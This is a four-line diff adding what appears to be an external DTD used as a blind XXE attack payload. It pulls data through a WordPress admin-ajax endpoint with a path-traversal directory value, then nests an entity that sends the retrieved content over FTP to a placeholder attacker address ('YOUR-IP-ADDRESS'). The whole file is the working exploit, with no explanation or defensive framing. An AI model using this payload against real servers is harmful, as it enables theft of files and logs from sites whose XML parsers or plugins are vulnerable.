@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "http://localhost/wp-admin/admin-ajax.php?action=read_system_logs&dir=..././www/html">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltration SYSTEM 'ftp://test:%file;@YOUR-IP-ADDRESS:443/'>">
+%eval;
+%exfiltration;
